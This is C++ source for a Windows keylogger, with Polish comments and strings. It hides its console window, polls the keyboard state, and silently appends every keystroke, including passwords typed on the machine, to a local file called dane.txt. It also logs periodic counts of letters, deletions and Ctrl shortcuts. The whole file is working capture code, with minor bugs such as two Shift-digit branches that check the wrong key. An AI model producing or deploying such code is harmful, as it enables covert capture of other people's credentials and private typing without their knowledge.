#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <iostream>
#include <iomanip>
#include <ctime>
#include <fstream>
using namespace std;

int letter_count=0;
int number_count=0;
int space_count=0;
int deleted_letters=0;
int ctrl_a=0;
int ctrl_s=0;
int ctrl_z=0;
int ctrl_x=0;
int ctrl_c=0;
int ctrl_v=0;

bool bul=false;

fstream plik("dane.txt", ios::out | ios::app | ios::binary);

void empty()
{
	SetKeyboardState(0);
}

bool left_arrow=false,right_arrow=false,up_arrow=false,down_arrow=false;
bool w=false,a=false,s=false,d=false;
bool wasd_usage=false;
bool escape=false;

void znaki_vk()
{
	int i=1;
	while(i--)
	{
		if(!GetAsyncKeyState(VK_ESCAPE))
		{
			escape=false;
		}
		
		if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(VK_MENU)&&GetAsyncKeyState(VK_SPACE))
		{
			plik<<"Koniec\r\n\r\n";
			plik.flush();
			bul=true;
			break;
		}
		
		else if(GetAsyncKeyState(VK_ESCAPE)&&GetAsyncKeyState(0x43))//c
		{
			plik<<"Game_mode on ,";
			plik.flush();
			wasd_usage=true;
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_ESCAPE)&&GetAsyncKeyState(0x56))//v
		{
			plik<<"Game_mode off ,";
			plik.flush();
			wasd_usage=false;
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_ESCAPE))
		{
			if(escape==false)
			{
				plik<<"ESCAPE ,";
				escape=true;			
			}
			
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_BACK))
		{
			plik<<"backspace ,";
			deleted_letters++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_TAB))
		{
			plik<<"tab ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_RETURN))
		{
			plik<<"enter\r\n\r\n";
			plik.flush();
			empty();
			break;
		}	
	
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x31))//1
		{
			plik<<"! ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x32))//2
		{
			plik<<"@ ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x33))//3
		{
			plik<<"# ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x31))//4
		{
			plik<<"$ ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x31))//5
		{
			plik<<"% ,";
			plik.flush();	
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x36))//6
		{
			plik<<"^ ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x37))//7
		{
			plik<<"& ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x38))//8
		{
			plik<<"* ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x39))//9
		{
			plik<<"()/( ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SHIFT)&&GetAsyncKeyState(0x30))//0
		{
			plik<<") ,";
			plik.flush();
			empty();
			break;
		}
			
		else if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(0x41))//a
		{
			plik<<"zaznacz_wszystko ,";
			ctrl_a++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(0x53))//s
		{
			plik<<"zapisz ,";
			ctrl_s++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(0x5A))//z
		{
			plik<<"cofnij ,";
			ctrl_z++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(0x58))//x
		{
			plik<<"wytnij ,";
			ctrl_x++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(0x43))//c
		{
			plik<<"kopiuj ,";
			ctrl_c++;
			plik.flush();
			empty();
			break;
		}
			
		else if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(0x56))//v
		{
			plik<<"wklej ,";
			ctrl_v++;
			plik.flush();
			empty();
			break;
		}
			
		else if(GetAsyncKeyState(VK_CONTROL)&&GetAsyncKeyState(VK_DELETE)&&GetAsyncKeyState(VK_MENU))//ctrl alt delete
		{
			plik<<"menedzer zadan ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_CAPITAL))
		{
			plik<<"cpas_lock ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SPACE))
		{
			plik<<"space\r\n";
			space_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_LEFT))
		{
			//left_arrow=false;
			right_arrow=false;
			up_arrow=false;
			down_arrow=false;
			
			if(left_arrow==false)
			{
				plik<<"left_arrow ,";
				left_arrow=true;
			}
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_UP))
		{
			left_arrow=false;
			right_arrow=false;
			//up_arrow=false;
			down_arrow=false;
			
			if(up_arrow==false)
			{
				plik<<"up_arrow ,";
				up_arrow=true;
			}
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_RIGHT))
		{
			
			left_arrow=false;
			//right_arrow=false;
			up_arrow=false;
			down_arrow=false;
			
			if(right_arrow==false)
			{
				plik<<"righr_arrow ,";
				right_arrow=true;
			}
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_DOWN))
		{
			left_arrow=false;
			right_arrow=false;
			up_arrow=false;
			//down_arrow=false;
			
			if(down_arrow==false)
			{	
				plik<<"down_arrow ,";
				down_arrow=true;
			}
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x30))
		{
			plik<<"0 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x31))
		{
			plik<<"1 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x32))
		{
			plik<<"2 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x33))
		{
			plik<<"3 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x34))
		{
			plik<<"4 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
			
		else if(GetAsyncKeyState(0x35))
		{
			plik<<"5 ,";
			number_count++;
			plik.flush();	
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x36))
		{
			plik<<"6 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x37))
		{
			plik<<"7 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x38))
		{
			plik<<"8 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x39))
		{
			plik<<"9 ,";
			number_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x41))
		{
			if(wasd_usage==false)
			{
				plik<<"A ,";
				letter_count++;
			}
			
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x42))
		{
			plik<<"B ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x43))
		{
			plik<<"C ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x44))
		{
			if(wasd_usage==false)
			{
				plik<<"D ,";
				letter_count++;
			}
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x45))
		{
			plik<<"E ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x46))
		{
			plik<<"F ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x47))
		{
			plik<<"G ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x48))
		{
			plik<<"H ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x49))
		{
			plik<<"I ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x4A))
		{
			plik<<"J ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x4B))
		{
			plik<<"K ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x4C))
		{
			plik<<"L ,";
			letter_count++;
			plik.flush();
			empty();
			break;
			}
		
		else if(GetAsyncKeyState(0x4D))
		{
			plik<<"M ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x4E))
		{
			plik<<"N ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x4F))
		{
			plik<<"O ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x50))
		{
			plik<<"P ,";
			letter_count++;
			plik.flush();
			empty();
			break;
			}
		
		else if(GetAsyncKeyState(0x51))
		{
			plik<<"Q ,";
			letter_count++;
			plik.flush();	
			empty();	
			break;
		}
		
		else if(GetAsyncKeyState(0x52))
		{
			plik<<"R ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x53))
		{
			if(wasd_usage==false)
			{
				plik<<"S ,";
				letter_count++;
			}
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x54))
		{
			plik<<"T ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x55))
		{
			plik<<"U ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x56))
		{
			plik<<"V ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x57))
		{
			if(wasd_usage==false)
			{
				plik<<"W ,";
				letter_count++;
			}
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x58))
		{
			plik<<"X ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x59))
		{
			plik<<"Y ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(0x5A))
		{
			plik<<"Z ,";
			letter_count++;
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F1))
		{
			plik<<"F1 ,";
			plik.flush();
			empty();
			break;
		}
	
		else if(GetAsyncKeyState(VK_F2))
		{
			plik<<"F2 ,";
			plik.flush();	
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F3))
		{
			plik<<"F3 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F4))
		{
			plik<<"F4 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F5))
		{
			plik<<"F5 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F6))
		{
			plik<<"F6 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F7))
		{
			plik<<"F7 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F8))
		{
			plik<<"F8 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F9))
		{
			plik<<"F9 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F10))
		{
			plik<<"F10 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F11))
		{
			plik<<"F11 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_F12))
		{
			plik<<"F12 ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_MULTIPLY))
		{
			plik<<"* ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_ADD))
		{
			plik<<"+ ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SEPARATOR))
		{
			plik<<"? ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_SUBTRACT))
		{
			plik<<"- ,";
			plik.flush();
			empty();
			break;
		}
		
		else if(GetAsyncKeyState(VK_DIVIDE))
		{
			plik<<"/ ,";
			plik.flush();
			empty();
			break;
		}
	}
}

time_t poczatek,koniec; 

void wypis_danych()
{
	plik<<"\r\n\r\n**********************************************************\r\n";
	plik<<"dane wejscia \r\n";
		
	plik<<"ilosc literek : "<<letter_count<<"\r\n";
	plik<<"ilosc liczb : "<<number_count<<"\r\n";
	plik<<"skasowane znaki : "<<deleted_letters<<"\r\n";
	plik<<"ilosc spacji : "<<space_count<<"\r\n";
	plik<<"ctrl a : "<<ctrl_a<<"\r\n";
	plik<<"ctrl s : "<<ctrl_s<<"\r\n";
	plik<<"ctrl z : "<<ctrl_z<<"\r\n";
	plik<<"ctrl x : "<<ctrl_x<<"\r\n";
	plik<<"ctrl c : "<<ctrl_c<<"\r\n";
	plik<<"ctrl v : "<<ctrl_v<<"\r\n";
	plik<<"Czas dzialanie to "<<setprecision(4)<<difftime(koniec,poczatek)/60<<" min\r\n";
	plik<<"**********************************************************\r\n\r\n\r\n";	
}

const int KEYEVENT_KEYUP = 0x02;
int x=0;	
int main()
{
	FreeConsole();
	//cout<<"Press CYRL+ALT+SPACE to stop \n";
	bul=false;
	empty();             
 	if (plik.good())
    {
    	plik<<"\r\n\r\nPOCZATEK SESJI\r\n\r\n";
		plik.flush();
		keybd_event(VK_F4,0,0,0);
    	keybd_event(VK_F4,0,KEYEVENT_KEYUP,0);
//    	chrono::time_point<chrono::system_clock> start,end;
//    	start = chrono::system_clock::now();
//		
//		time_t start_time = chrono::system_clock::to_time_t(start);
//    	plik<< "\r\n poczatek programu o "<<ctime(&start_time);
    	time(&poczatek);
    	
		while(bul!=true)
		{
			Sleep(150);
			znaki_vk();
			x++;
			
			if(x>40)
			{
				time(&koniec);
			
				if((int)difftime(koniec,poczatek)%1800==0)
				{
					Sleep(1000);
					wypis_danych();
				}
			}
		}
		
		time(&koniec);
		wypis_danych();
		
//		end = chrono::system_clock::now();
//		chrono::duration<double> elapsed_second = end-start;
//		time_t end_time = chrono::system_clock::to_time_t(end);
//		
//		plik<< "\r\n koniec programu o "<<ctime(&end_time);
//		plik<< "\r\n czas dzialania "<<elapsed_seconds.conut()<<"s\r\n"
	}
    plik.close();
//	AllocConsole();	KONSOLA POJAWIA SIE
}   
